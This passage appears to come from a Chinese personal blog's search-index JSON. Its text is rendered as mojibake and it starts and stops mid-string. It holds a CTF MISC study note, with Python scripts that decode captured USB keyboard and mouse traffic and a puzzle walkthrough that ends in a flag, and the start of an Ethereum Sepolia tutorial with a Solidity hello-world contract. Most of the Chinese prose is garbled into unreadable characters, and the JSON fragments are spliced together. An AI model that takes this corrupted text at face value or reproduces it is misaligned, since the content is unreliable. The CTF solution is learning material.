‡æµé‡å’Œé”®ç›˜æµé‡\né¼ æ ‡æµé‡\rUSBåè®®é¼ æ ‡æ•°æ®éƒ¨åˆ†åœ¨Leftover Capture DataåŸŸä¸­ï¼Œæ•°æ®é•¿åº¦ä¸ºå››ä¸ªå­—èŠ‚ã€‚ å…¶ä¸­ï¼Œ ç¬¬ä¸€ä¸ªå­—èŠ‚ä»£è¡¨æŒ‰é”®ï¼Œå½“å–0x00æ—¶ï¼Œä»£è¡¨æ²¡æœ‰æŒ‰é”®ï¼Œä¸º0x01æ—¶ï¼Œä»£è¡¨æŒ‰å·¦æŒ‰é”®ï¼Œä¸º0x02æ—¶ï¼Œä»£è¡¨å½“å‰æŒ‰é”®ä¸ºå³é”®ï¼› ç¬¬äºŒä¸ªå­—èŠ‚å¯ä»¥æˆæ˜¯ä¸€ä¸ªsigned byteç±»å‹ï¼Œå…¶æœ€é«˜ä½ä¸ºç¬¦å·ä½ï¼Œå½“è¿™ä¸ªå€¼ä¸ºæ­£æ—¶ï¼Œä»£è¡¨é¼ æ ‡æ°´å¹³å³ç§»åŠ¨å¤šå°‘åƒç´ ï¼Œä¸ºè´Ÿæ—¶ï¼Œä»£è¡¨æ°´å¹³å·¦ç§»å¤šå°‘åƒç´ ï¼› ç¬¬ä¸‰ä¸ªå­—èŠ‚ä¸ç¬¬äºŒä¸ªå­—èŠ‚ç±»ä¼¼ï¼Œä»£è¡¨å‚ç›´ä¸Šä¸‹ç§»åŠ¨çš„åç§»ã€‚\né”®ç›˜æµé‡\ré”®ç›˜æ•°æ®åŒ…çš„æ•°æ®é•¿åº¦ä¸º8ä¸ªå­—èŠ‚\nUSBä½¿ç”¨HIDåè®®è§„å®šé”®ç›˜æ˜ å°„ï¼Œå…·ä½“æ˜ å°„è¡¨æˆ‘æ²¡æ‰¾åˆ°ï¼Œå…·ä½“å¯ä»¥ç¿»ç¿»HIDåè®®\n1å’Œ2ä¸¤é“é¢˜çš„æ€è·¯æ˜¯ä¸€æ ·çš„\næŠŠpcapæ–‡ä»¶æ‰”è¿›kaliï¼Œç„¶åç”¨tsharkå°† leftover capture data æå–å‡ºæ¥ï¼š\n1 tshark -r example.pcap -T fields -e usb.capdata //å¦‚æœæƒ³å¯¼å…¥usbdata.txtæ–‡ä»¶ä¸­ï¼Œåé¢åŠ ä¸Šå‚æ•°ï¼š\u0026gt;usbdata.txt ç„¶åçœ‹ç‰¹è´¨ï¼Œé•¿çš„æ˜¯é”®ç›˜æµé‡ï¼ŒçŸ­çš„æ˜¯é¼ æ ‡æµé‡\næœ€åç”¨è„šæœ¬è§£æ\né”®ç›˜è½¬åŒ–è„šæœ¬ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 mappings = { 0x04:\u0026#34;A\u0026#34;, 0x05:\u0026#34;B\u0026#34;, 0x06:\u0026#34;C\u0026#34;, 0x07:\u0026#34;D\u0026#34;, 0x08:\u0026#34;E\u0026#34;, 0x09:\u0026#34;F\u0026#34;, 0x0A:\u0026#34;G\u0026#34;, 0x0B:\u0026#34;H\u0026#34;, 0x0C:\u0026#34;I\u0026#34;, 0x0D:\u0026#34;J\u0026#34;, 0x0E:\u0026#34;K\u0026#34;, 0x0F:\u0026#34;L\u0026#34;, 0x10:\u0026#34;M\u0026#34;, 0x11:\u0026#34;N\u0026#34;,0x12:\u0026#34;O\u0026#34;, 0x13:\u0026#34;P\u0026#34;, 0x14:\u0026#34;Q\u0026#34;, 0x15:\u0026#34;R\u0026#34;, 0x16:\u0026#34;S\u0026#34;, 0x17:\u0026#34;T\u0026#34;, 0x18:\u0026#34;U\u0026#34;,0x19:\u0026#34;V\u0026#34;, 0x1A:\u0026#34;W\u0026#34;, 0x1B:\u0026#34;X\u0026#34;, 0x1C:\u0026#34;Y\u0026#34;, 0x1D:\u0026#34;Z\u0026#34;, 0x1E:\u0026#34;1\u0026#34;, 0x1F:\u0026#34;2\u0026#34;, 0x20:\u0026#34;3\u0026#34;, 0x21:\u0026#34;4\u0026#34;, 0x22:\u0026#34;5\u0026#34;, 0x23:\u0026#34;6\u0026#34;, 0x24:\u0026#34;7\u0026#34;, 0x25:\u0026#34;8\u0026#34;, 0x26:\u0026#34;9\u0026#34;, 0x27:\u0026#34;0\u0026#34;, 0x28:\u0026#34;n\u0026#34;, 0x2a:\u0026#34;[DEL]\u0026#34;, 0X2B:\u0026#34; \u0026#34;, 0x2C:\u0026#34; \u0026#34;, 0x2D:\u0026#34;-\u0026#34;, 0x2E:\u0026#34;=\u0026#34;, 0x2F:\u0026#34;[\u0026#34;, 0x30:\u0026#34;]\u0026#34;, 0x31:\u0026#34;\\\\\u0026#34;, 0x32:\u0026#34;~\u0026#34;, 0x33:\u0026#34;;\u0026#34;, 0x34:\u0026#34;\u0026#39;\u0026#34;, 0x36:\u0026#34;,\u0026#34;, 0x37:\u0026#34;.\u0026#34; } nums = [] keys = open(\u0026#39;usbdata.txt\u0026#39;) for i in keys: i = i.strip() line = \u0026#34;\u0026#34; for j in range(0,len(i),2): line += i[j:j+2] + \u0026#34;:\u0026#34; line = line[:len(line)-1] # print(line) if line[0]!=\u0026#39;0\u0026#39; or line[1]!=\u0026#39;0\u0026#39; or line[3]!=\u0026#39;0\u0026#39; or line[4]!=\u0026#39;0\u0026#39; or line[9]!=\u0026#39;0\u0026#39; or line[10]!=\u0026#39;0\u0026#39; or line[12]!=\u0026#39;0\u0026#39; or line[13]!=\u0026#39;0\u0026#39; or line[15]!=\u0026#39;0\u0026#39; or line[16]!=\u0026#39;0\u0026#39; or line[18]!=\u0026#39;0\u0026#39; or line[19]!=\u0026#39;0\u0026#39; or line[21]!=\u0026#39;0\u0026#39; or line[22]!=\u0026#39;0\u0026#39;: continue nums.append(int(line[6:8],16)) keys.close() output = \u0026#34;\u0026#34; for n in nums: if n == 0 : continue if n in mappings: output += mappings[n] else: output += \u0026#39;[unknown]\u0026#39; print(\u0026#39;output : \u0026#39; + output) # è„šæœ¬è·‘çš„ç»“æœä¸­å»æ‰unknowï¼Œæ³¨æ„delé”® é¼ æ ‡è½¬åŒ–è„šæœ¬ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 nums = [] keys = open(\u0026#39;./mouse_data.txt\u0026#39;,\u0026#39;r\u0026#39;) f = open(\u0026#39;xy.txt\u0026#39;,\u0026#39;w\u0026#39;) posx = 0 posy = 0 for i in keys: line = \u0026#34;\u0026#34; i = i.strip() for j in range(0,len(i),2): line += i[j:j+2] + \u0026#34;:\u0026#34; line = line[:len(line)-1] if len(line) != 11 : continue x = int(line[3:5],16) y = int(line[6:8],16) if x \u0026gt; 127 : x -= 256 if y \u0026gt; 127 : y -= 256 posx += x posy += y btn_flag = int(line[0:2],16) # 1 for left , 2 for right , 0 for nothing if btn_flag == 1 : # 1 ä»£è¡¨å·¦é”® // è¿™é‡Œ0ï¼Œ1ï¼Œ2éƒ½è¯•è¯• f.write(str(posx)) f.write(\u0026#39; \u0026#39;) f.write(str(posy)) f.write(\u0026#39;\\n\u0026#39;) f.close() from PIL import Image img = Image.new(\u0026#39;RGB\u0026#39;,(2000,2000),(255,255,255))#åˆ›å»ºImageå¯¹è±¡ f =open(\u0026#39;xy.txt\u0026#39;)#xy.txtæ–‡ä»¶ for line in f.readlines(): point =line.split() img.putpixel((int(point[0]),int(point[1])),(0,0,0))#è¯»å–æ–‡ä»¶ä¸­çš„æ¯ä¸€è¡Œï¼Œå¹¶ä¿®æ”¹åƒç´  f.close() img.show() ç¬¬ä¸‰é¢˜æ˜¯BUUåŸé¢˜\nç»™ä¸€ä¸ªrarå’Œä¸€ä¸ªftm\nå°è¯•è§£å‹rarå¤±è´¥\nç”±äºRARæ˜¯æœ‰å››ä¸ªæ–‡ä»¶å—ç»„æˆçš„ï¼Œåˆ†åˆ«æ˜¯æ ‡è®°å—ã€å½’æ¡£å¤´éƒ¨å—ã€æ–‡ä»¶å—ã€ç»“æŸå—ï¼Œè¿™äº›å—ä¹‹é—´æ²¡æœ‰å›ºå®šåœ°å…ˆåé¡ºåºï¼Œä½†è¦æ±‚ç¬¬ä¸€ä¸ªå—å¿…é¡»æ˜¯æ ‡å¿—å—å¹¶ä¸”å…¶åç´§è·Ÿä¸€ä¸ªå½’æ¡£å¤´éƒ¨å—ã€‚è¯¦æƒ…çœ‹ï¼š\nCTFè§£é¢˜æŠ€èƒ½ä¹‹å‹ç¼©åŒ…åˆ†æåŸºç¡€ç¯‡\næˆ‘ä»¬æŠŠrar æ‰”è¿›010æç¤ºæ¨¡å—ä¸‰æœ‰é”™è¯¯ï¼Œå¯¹ç…§åšå®¢ä¸­çš„å†…å®¹ï¼ˆæ–‡ä»¶å—çš„HEAD_TYPEåº”è¯¥æ˜¯0x74è€Œä¸æ˜¯0x7Aã€‚ï¼‰æŠŠ 7Aæ”¹æˆ74\nç„¶åè§£å‹å¾—åˆ°ä¸€ä¸ªpng\næŠŠpngæ‰”è¿›stegsolveå‘ç°åœ¨Blue plane 0 æœ‰äºŒç»´ç \næ‰«ç å¾—åˆ°ci{v3erf_0tygidv2_fc0}\nè¿˜æœ‰key.ftmæ²¡ç”¨åˆ°ï¼Œæœ‰keyè¯´æ˜flagè¢«åŠ å¯†äº†\næŠŠkey.ftmæ‰”è¿›010ï¼Œå‘ç°æœ‰â€œPKâ€,å°è¯•æœç´¢ 50 4B 03 04 ï¼Œè¯´æ˜ftmä¸­è—äº†ä¸€ä¸ªzipï¼ŒæŠŠ50 4Bpcapå‰çš„å†…å®¹å…¨éƒ¨åˆ å»ï¼Œå†ä¿å­˜ä¸ºzip\nè§£å‹å¾—åˆ°ä¸€ä¸ªpcapï¼Œç”¨tsharkæå–leftover capture dataï¼Œå‘ç°æ˜¯é”®ç›˜æµé‡ï¼Œè·‘è„šæœ¬æ‹¿åˆ°keyï¼š XINAN\nåŠ å¯†æ–¹å¼æ˜¯ç»´å‰å°¼äºš+æ …æ \nè§£å¯†å¾—åˆ°flag\nflag{vig3ne2e_is_c00l}\nMISCå¸¸è§åŠ å¯†æ–¹æ³•ï¼š\nCTF å¸¸è§å¯†ç ç¼–ç åŠå…¶è§£å†³æ–¹æ¡ˆ\n","date":"2025-10-07T10:29:47+08:00","permalink":"https://Oight.github.io/p/misc%E5%AD%A6%E4%B9%A0%E5%AE%9E%E5%BD%95%E4%BA%8C/","title":"MISCå­¦ä¹ å®å½•ï¼ˆäºŒï¼‰"},{"content":"åŒºå—é“¾å­¦ä¹ ï¼ˆä¸€ï¼‰\råŒºå—é“¾ä½œä¸ºè¾ƒä¸ºå‰æ²¿çš„é¢†åŸŸï¼Œè¿‘å‡ å¹´ä¹Ÿåœ¨è¿…é€Ÿå‘å±•\næœ€å¼€å§‹æ¥è§¦åŒºå—é“¾çš„å†…å®¹æ˜¯ä»è¾ƒæ–°çš„move-suiä½“ç³»å¼€å§‹çš„ï¼Œè¿™ä¸ªåé¢å¦å¤–å†å†™åšå®¢ä»‹ç»å§ï¼ˆæŒ–å‘+1ï¼‰\næœ€è¿‘æ¥è§¦åˆ°äº†æ›´ä¸ºæˆç†Ÿçš„ä»¥å¤ªåŠä½“ç³»\næ‰€ä»¥å†™åšå®¢è®°å½•ä¸€ä¸‹ï¼ˆä¸»è¦æ˜¯å› ä¸ºEthereum æµ‹è¯•ç½‘æ°´é¾™å¤´å¤ªå¤šäº†ï¼‰\nåŒºå—é“¾æµè§ˆå™¨\råŒºå—é“¾æµè§ˆå™¨ï¼Œæ˜¯æŒ‡æä¾›ç”¨æˆ·æµè§ˆä¸æŸ¥è¯¢åŒºå—é“¾é“¾ä¸Šä¿¡æ¯çš„å·¥å…·ã€‚å®ƒå’Œæ™®é€šçš„æµè§ˆå™¨ä¸åŒï¼Œå®ƒåªèƒ½æŸ¥è¯¢åŒºå—é“¾ä¿¡æ¯ä¸Šçš„å·¥å…·ï¼Œå®ƒæ˜¯å»ºç«‹åœ¨æ™®é€šçš„ä¸­å¿ƒåŒ–ç½‘ç»œä¸Šï¼Œä¸“é—¨ä¸ºç”¨æˆ·æä¾›æµè§ˆä¸æŸ¥è¯¢åŒºå—é“¾ä¸Šä¿¡æ¯çš„ä¸€ç§æœç´¢å·¥å…·ã€‚å¦‚ä½•åˆ©ç”¨åŒºå—é“¾æµè§ˆå™¨æŸ¥è¯¢åœ°å€äº¤æ˜“ä¿¡æ¯å’ŒåŒºå—æ•°æ®ç­‰åŸºç¡€ä¿¡æ¯ï¼Œå‡ ä¹æˆäº†æ¯ä¸ªWEB3äººçš„å¿…å¤‡æŠ€èƒ½ã€‚\næ¯ä¸ªåŒºå—é“¾ç³»ç»Ÿéƒ½æœ‰æœ¬èº«ç‰¹å®šçš„æµè§ˆå™¨ï¼Œæ¯”å¦‚ï¼Œæ¯”ç‰¹å¸åŒºå—é“¾æµè§ˆå™¨åªèƒ½æŸ¥è¯¢æ¯”ç‰¹å¸çš„ç›¸å…³åŒºå—ä¿¡æ¯ï¼Œä»¥å¤ªåŠåŒºå—é“¾æµè§ˆå™¨åªèƒ½æŸ¥è¯¢ä»¥å¤ªåŠçš„ç›¸å…³åŒºå—ä¿¡æ¯ã€‚\nä»¥å¤ª Sepolia åŒºå—é“¾æµè§ˆå™¨ï¼š\nSepolia.ethrescan\nåŒºå—é“¾æµè§ˆå™¨ç›¸å…³æœ¯è¯­\råŒºå— Block\nåŒºå—æ˜¯æŒ‡ä¸€æ‰¹äº¤æ˜“çš„ç»„åˆï¼Œå¹¶ä¸”åŒ…å«é“¾ä¸­ä¸Šä¸€ä¸ªåŒºå—çš„å“ˆå¸Œã€‚è¿™å°†åŒºå—è¿æ¥åœ¨ä¸€èµ·ï¼ˆæˆä¸ºä¸€ä¸ªé“¾ï¼‰ï¼Œå› ä¸ºå“ˆå¸Œæ˜¯ä»åŒºå—æ•°æ®ä¸­åŠ å¯†å¾—å‡ºçš„ã€‚è¿™å¯ä»¥é˜²æ­¢æ¬ºè¯ˆï¼Œå› ä¸ºå†å²ä¸Šä»»ä½•åŒºå—çš„ä¸€æ¬¡æ›´æ”¹éƒ½ä¼šä½¿æ‰€æœ‰åç»­åŒºå—æ— æ•ˆï¼Œå› ä¸ºæ‰€æœ‰åç»­å“ˆå¸Œéƒ½ä¼šæ›´æ”¹ï¼Œå¹¶ä¸”è¿è¡ŒåŒºå—é“¾çš„æ¯ä¸ªäººéƒ½ä¼šæ³¨æ„åˆ°ã€‚\nåˆ›ä¸–åŒºå— Genesis Block\nåŒºå—é“¾ä¸Šçš„ç¬¬ä¸€ä¸ªåŒºå—ï¼Œç”¨äºåˆå§‹åŒ–ç‰¹å®šçš„åŒºå—é“¾ä»¥åŠåŸç”ŸåŠ å¯†è´§å¸ã€‚\nåŒºå—é“¾ Blockchain\nä»¥å¤ªåŠç½‘ç»œä¸­ç”±å·¥ä½œé‡è¯æ˜éªŒè¯çš„åŒºå—åºåˆ—ï¼Œæ¯ä¸ªåŒºå—ä¸å…¶å‰ä¸€ä¸ªåŒºå—ç›¸è¿ï¼Œå¯ä¸€ç›´è¿½æº¯åˆ°åˆ›ä¸–åŒºå—ã€‚å®ƒæ²¡æœ‰åŒºå—å¤§å°é™åˆ¶ï¼Œè€Œä½¿ç”¨gas ä¸Šé™æ¥è°ƒæ•´åŒºå—å¤§å°ã€‚\näº¤æ˜“æƒ…å†µï¼šå¯ä»¥é€šè¿‡æŸ¥è¯¢é’±åŒ…åœ°å€æ¥æŸ¥è¯¢ä½™é¢æˆ–è€…äº¤æ˜“çš„è¯¦ç»†ä¿¡æ¯ã€‚æ¯”å¦‚ä½ çŸ¥é“æŸäººçš„æ¯”ç‰¹å¸åœ°å€ï¼Œç”±äºåŒºå—é“¾çš„å…¬å¼€é€æ˜æ€§ï¼Œå½“ä½ åœ¨æ¯”ç‰¹å¸åŒºå—é“¾æµè§ˆå™¨ä¸ŠæŸ¥è¯¢æ­¤åœ°å€æ—¶ï¼Œä½ å¯ä»¥çœ‹åˆ°å®ƒçš„æ‰€æœ‰äº¤æ˜“è®°å½•ã€‚\nä¸€èˆ¬åŒºå—é“¾æµè§ˆå™¨ä¸­æœ‰ä¸‰ä¸ªåœ°æ–¹å¯èƒ½å‡ºç°æ˜æ–‡æ•°æ®ï¼š\nInput Data / Full Inputï¼ˆå¸¸è§ä½ç½®åœ¨ â€œInput Dataâ€ æˆ– â€œFunction \u0026amp; Input Dataâ€ï¼‰\nLogs / Event Logsï¼ˆæœ‰æ—¶ dev ä¼šæŠŠå¯è¯»å­—ç¬¦ä¸²å¡åœ¨ event data é‡Œï¼‰\nInternal Txns / Token Transfers / Contract Creationï¼ˆå¦‚æœè¿™ç¬”äº¤æ˜“æ˜¯åˆçº¦åˆ›å»ºï¼Œåˆçº¦å­—èŠ‚ç é‡Œå¯èƒ½è—å­—ç¬¦ä¸²ï¼‰\nInput Data ï¼š\råœ¨ä»¥å¤ªåŠåè®®ä¸­ï¼Œ\nå½“äº¤æ˜“ï¼ˆtransactionï¼‰ä¸ºåˆçº¦åˆ›å»ºæ—¶ï¼Œinput data æ˜¯è´¦æˆ·åˆå§‹åŒ–ç¨‹åºçš„ EVM ä»£ç ï¼›\nè€Œå½“äº¤æ˜“ï¼ˆtransactionï¼‰ä¸ºæ¶ˆæ¯è°ƒç”¨æ—¶ï¼Œinput data æ˜¯åˆçº¦å‡½æ•°è°ƒç”¨æ•°æ®ã€‚\næ­£å¸¸æƒ…å†µä¸‹ç®€å•çš„æ¶ˆæ¯è°ƒç”¨å¦‚è°ƒç”¨è½¬è´¦å‡½æ•°æ—¶éœ€è¦å¡«å†™ä½ è¦è½¬è´¦çš„åœ°å€ _to å’Œä½ è¦è½¬è´¦çš„æ•°é‡ _amountï¼Œè¿™äº›åŸºæœ¬ä¿¡æ¯éƒ½åŒ…å«åœ¨ input data é‡Œé¢ã€‚\nè¯¦è§ï¼šäº¤æ˜“Input Data è§£æ\nLogs and Event Logs\rEthereumæ—¥å¿—å’Œäº‹ä»¶æ˜¯Ethereumç”Ÿæ€ç³»ç»Ÿä¸­çš„é‡è¦ç»„æˆéƒ¨åˆ†ã€‚ä½¿å¼€å‘äººå‘˜èƒ½å¤Ÿé€šè¿‡å…¶è·Ÿè¸ªå¹¶è®°å½•æ™ºèƒ½åˆçº¦åœ¨åŒºå—é“¾ä¸Šçš„ç‰¹å®šæ“ä½œæˆ–æ•°æ®ã€‚\nEVMä¸­çš„äº‹ä»¶å’Œæ—¥å¿—\nåœ¨EVMï¼ˆä»¥å¤ªåŠè™šæ‹Ÿæœºï¼‰ä¸­ï¼Œäº‹ä»¶æ˜¯æ™ºèƒ½åˆçº¦åœ¨æ‰§è¡Œé‡è¦æ“ä½œæ—¶å‘å‡ºçš„æ¶ˆæ¯ã€‚ä¾‹å¦‚ï¼Œå½“ä»£å¸è½¬ç§»æˆ–åˆçº¦æ•°æ®æ›´æ–°æ—¶ï¼Œåˆçº¦ä¼šè§¦å‘ä¸€ä¸ªäº‹ä»¶ä»¥é€šçŸ¥å¤–éƒ¨ç³»ç»Ÿã€‚äº‹ä»¶é€šè¿‡eventå…³é”®å­—åœ¨æ™ºèƒ½åˆçº¦ä¸­å®šä¹‰ã€‚\nåœ¨ä¸Šè¿°ç¤ºä¾‹ä¸­ï¼ŒTransferäº‹ä»¶ç”¨äºè®°å½•ä»£å¸è½¬ç§»ã€‚å®ƒæœ‰ä¸‰ä¸ªå‚æ•°ï¼š\nfromï¼šå‘é€æ–¹åœ°å€ã€‚\ntoï¼šæ¥æ”¶æ–¹åœ°å€ã€‚\nvalueï¼šè½¬ç§»çš„é‡‘é¢ã€‚\nåœ¨æ‰§è¡Œæ™ºèƒ½åˆçº¦å‡½æ•°æœŸé—´ä½¿ç”¨emitå…³é”®å­—è§¦å‘æ—¶é—´ã€‚å‘å‡ºçš„äº‹ä»¶æ•°æ®å­˜å‚¨åœ¨æ—¥å¿—ä¸­ï¼Œè¿™äº›æ—¥å¿—æ˜¯äº¤æ˜“å›æ‰§çš„ä¸€éƒ¨åˆ†ã€‚\næ—¥å¿—ï¼š\næ—¥å¿—æ˜¯è¿™äº›äº‹ä»¶çš„è®°å½•ã€‚å½“äº‹ä»¶å‘ç”Ÿæ—¶ï¼Œå®ƒä»¬ä¼šå­˜å‚¨æœ‰å…³æ‰€å‘ç”Ÿæƒ…å†µçš„ä¿¡æ¯ï¼Œä¾‹å¦‚å‘é€è€…ã€æ¥æ”¶è€…å’Œè½¬ç§»çš„ä»£å¸æ•°é‡ã€‚æ—¥å¿—è¢«åŒ…å«åœ¨äº¤æ˜“å›æ‰§ä¸­ï¼Œä½¿å…¶æ˜“äºæ£€ç´¢ä»¥è¿›è¡Œè·Ÿè¸ªæˆ–åˆ†æã€‚\né€šè¿‡è§¦å‘äº‹ä»¶å¹¶å°†å…¶è®°å½•ä¸ºäº¤æ˜“æ”¶æ®ä¸­çš„æ—¥å¿—ï¼Œå¼€å‘äººå‘˜å¯ä»¥è½»æ¾è¿½è¸ªç‰¹å®šçš„æ“ä½œï¼Œå¦‚ä»£å¸è½¬ç§»ã€é“¸é€ ã€é”€æ¯æˆ–åˆçº¦çŠ¶æ€çš„å˜æ›´ã€‚è¿™ç§æ–¹å¼èŠ‚çœäº†å­˜å‚¨ç©ºé—´å¹¶é™ä½äº†äº¤æ˜“çš„Gasè´¹ç”¨ï¼Œä¸ºä¸æ™ºèƒ½åˆçº¦äº¤äº’å’Œç†è§£æ™ºèƒ½åˆçº¦è¡Œä¸ºæä¾›äº†é«˜æ•ˆä¸”å…·æœ‰æˆæœ¬æ•ˆç›Šçš„æ–¹æ³•ã€‚\nè¯¦è§ï¼šä»¥å¤ªåŠé“¾ä¸Š logså’Œevents è§£æ\nContract\rè¿™ä¸€éƒ¨åˆ†å°±æ˜¯å¤§åé¼é¼çš„æ™ºèƒ½åˆçº¦äº†ï¼ŒEthereumçš„æ™ºèƒ½åˆçº¦ä½¿ç”¨Solidityè¯­è¨€ç¼–å†™ï¼Œå…³äºæ™ºèƒ½åˆçº¦ï¼Œå°†ä¼šå¦å†™ä¸€ç¯‡åšå®¢è¯¦ç»†æ¢ç´¢ä¸€ä¸‹\nè¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯å¦‚æœä½œè€…æ²¡æœ‰å¼€æºè‡ªå·±çš„æ™ºèƒ½åˆçº¦çš„è¯ï¼ŒåŒºå—é“¾æµè§ˆå™¨ä¸Šåªèƒ½çœ‹åˆ°ç¼–è¯‘å¥½çš„å­—èŠ‚ç ï¼Œè¿™ç§æƒ…å†µä¸‹æƒ³è¦äº†è§£åˆçº¦å†…å®¹å°±éœ€è¦é€†å‘å­—èŠ‚ç \nå¦‚ä½•å¼€æºè‡ªå·±çš„æ™ºèƒ½åˆçº¦ï¼šWeb3 å¼€å‘æ™ºèƒ½åˆçº¦éƒ¨ç½²åŠåˆçº¦éªŒè¯å…¨æµç¨‹\nåŒºå—é“¾æµ‹è¯•ç½‘\rç›®å‰æˆ‘ä¸»è¦æ¥è§¦çš„æ˜¯Sepoliaæµ‹è¯•ç½‘\nä»€ä¹ˆæ˜¯æµ‹è¯•ç½‘\ræµ‹è¯•ç½‘è¢«è®¾è®¡æˆæ¨¡ä»¿ä¸»ç½‘ç¯å¢ƒï¼Œä»¥ä½¿å¼€å‘äººå‘˜èƒ½å¤Ÿåœ¨å°†åˆçº¦éƒ¨ç½²åˆ°ä¸»ç½‘ä¹‹å‰æµ‹è¯•å’Œæ’é™¤åº”ç”¨ç¨‹åºçš„é—®é¢˜ï¼Œè€Œä¸ä¼šæœ‰ä»»ä½•ä»·å€¼å¤„äºé£é™©ä¹‹ä¸­ã€‚\né€šå¸¸æƒ…å†µä¸‹ï¼Œå°†ä»»ä½•åˆçº¦ä»£ç åœ¨æµ‹è¯•ç½‘ä¸Šè¿›è¡Œæµ‹è¯•ï¼Œç„¶åå†éƒ¨ç½²åˆ°ä¸»ç½‘ä¸Šè¢«è®¤ä¸ºæ˜¯ä¸€ä¸ªè‰¯å¥½çš„åšæ³• - å¤§å¤šæ•°é“¾ä¸Šåº”ç”¨ç¨‹åºéƒ½ä¼šåœ¨æµ‹è¯•ç½‘ä¸Šéƒ¨ç½²å‰¯æœ¬ï¼Œä»¥ä¾¿å¼€å‘äººå‘˜è¿›è¡Œæ•…éšœæ’é™¤ã€‚\nç®€å•æ¥è¯´ï¼Œå°±æ˜¯ç”±äºåŒºå—é“¾ä¸èµ„äº§æ¯æ¯ç›¸å…³ï¼Œå¼€å‘è€…åœ¨å¼€å‘çš„æ—¶å€™è‡ªç„¶ä¸èƒ½åœ¨ä¸»é“¾ä¸Šæµ‹è¯•ï¼Œé¿å…é€ æˆå·¨å¤§çš„æŸå¤±ï¼›ä¸ºäº†æ–¹ä¾¿å¼€å‘è€…æµ‹è¯•è‡ªå·±çš„åŒºå—é“¾åº”ç”¨ï¼Œå‡ºäºæµ‹è¯•å’Œå­¦ä¹ çš„ç›®çš„ï¼Œå¼€è¾Ÿäº†ä¸€æ¡æ–°çš„é“¾ä½œä¸ºæµ‹è¯•ç½‘ã€‚\næµ‹è¯•ç½‘å’Œä¸»ç½‘çš„å·®å¼‚åªæ˜¯æµ‹è¯•ç½‘ä¸Šçš„è™šæ‹Ÿè´§å¸å¹¶æ²¡æœ‰ä»·å€¼ï¼Œä»¥å¤ªåŠåº”ç”¨ç¨‹åºå¼€å‘è€…å¯ä»¥åœ¨è¿™é‡Œæµ‹è¯•ä»–ä»¬çš„æ™ºèƒ½åˆçº¦ï¼Œè€Œæ— éœ€èŠ±è´¹çœŸå®çš„ ETH ä»£å¸\nä»€ä¹ˆæ˜¯Sepolia\rSepoliaæ˜¯ä»¥å¤ªåŠæ ¸å¿ƒå¼€å‘äººå‘˜ä¸ºæ™ºèƒ½åˆçº¦åº”ç”¨ç¨‹åºå¼€å‘æ¨èçš„é»˜è®¤æµ‹è¯•ç½‘ã€‚Sepoliaæœ€åˆæ˜¯ç”±ä»¥å¤ªåŠæ ¸å¿ƒå¼€å‘äººå‘˜äº2021å¹´10æœˆæ¨å‡ºçš„ä¸€ç§æƒå¨æ€§æµ‹è¯•ç½‘ã€‚è¯¥ç½‘ç»œåæ¥è½¬å˜ä¸ºä¸€ç§æƒç›Šè¯æ˜å…±è¯†æœºåˆ¶ï¼Œä»¥æ¨¡æ‹Ÿä»¥å¤ªåŠä¸»ç½‘çš„è¿è¡Œç¯å¢ƒã€‚\nSepoliaä½¿ç”¨äº†ä¸€ç»„ç»è¿‡æˆæƒçš„éªŒè¯å™¨ã€‚ç”±äºå®ƒæ˜¯ä¸€ä¸ªç›¸å¯¹è¾ƒæ–°çš„æµ‹è¯•ç½‘ç»œï¼ŒçŠ¶æ€è¾ƒå°ï¼Œå› æ­¤è¯¥ç½‘ç»œåŒæ­¥é€Ÿåº¦å¿«ï¼Œè¿è¡ŒèŠ‚ç‚¹æ‰€éœ€çš„å­˜å‚¨ç©ºé—´æ¯”ä¸»ç½‘æˆ–å…¶ä»–æµ‹è¯•ç½‘è¦å°‘ã€‚è¿™äº›åŠŸèƒ½å¯¹äºå¸Œæœ›ç›´æ¥ä¸ç½‘ç»œäº¤äº’å¹¶è¿è¡ŒèŠ‚ç‚¹çš„å¼€å‘äººå‘˜éå¸¸æœ‰ç”¨ã€‚\nä¸å…¶ä»–ä»¥å¤ªåŠæµ‹è¯•ç½‘ç»œï¼ˆå¦‚Goerliï¼‰ç›¸æ¯”ï¼ŒSepoliaæµ‹è¯•ç½‘çš„æµ‹è¯•ç½‘ETHé€šè¯æ€»ä¾›åº”é‡æ²¡æœ‰ä¸Šé™ï¼Œè¿™ä½¿å¾—ä½¿ç”¨Sepoliaçš„å¼€å‘äººå‘˜æ›´æœ‰å¯èƒ½åœ¨æœªæ¥ç»§ç»­è®¿é—®æµ‹è¯•ç½‘é€šè¯ã€‚\nEthereum Sepolia æµ‹è¯•ç½‘æ°´é¾™å¤´ï¼š\nZANæ°´é¾™å¤´\nalchemy\nè°·æ­Œäº‘\nother\nSolidity\råœ¨Ethereumä¸Šè¿è¡Œçš„æ™ºèƒ½åˆçº¦åŸºæœ¬éƒ½æ˜¯ç”±Solidityè¯­è¨€ç¼–å†™çš„ï¼Œå…³äºSolidityè¯­è¨€å°†ä¼šå†å¦å¤–ä¸€ç¯‡åšå®¢ä¸­è¯¦ç»†ä»‹ç»ã€‚æˆ‘ä»¬å…ˆå†™ä¸€ä¸ªhelloworldï¼ˆï¼‰ã€‚\nå†™ä¸€ä¸ªhelloworld\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 //SPDX-License-Identifier: MIT pragma solidity ^0.8.30; contract HelloWorld { string str_val = \u0026#34;Hello World!\u0026#34;; struct Info { string pharse; uint256 id; address addr; } Info[] infos; mapping(uint256 id =\u0026gt; Info info) info_mapping; function say_hello(uint256 _id) public view returns(string memory) { if (info_mapping[_id].addr == address (0x0)) { return add_info(str_val); } else { return add_info(info_mapping[_id].pharse); } } function set_helloworld(string memory new_string, uint256 _id) public { Info memory info = Info(new_string, _id, msg.sender); info_mapping[_id] = info; } function add_info(string memory helloworld) internal pure returns(string memory) { return string.concat(helloworld, \u0026#34;This is my first smart contract.\u0026#34;); } } Solidity æ•™ç¨‹\n","date":"2025-10-07T10:29:47+08:00","permalink":"https://Oight.github.io/p/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%80/","title":"åŒºå—é“¾å­¦ä¹ ï¼ˆä¸€ï¼‰"},{"content":"MISCå­¦ä¹ 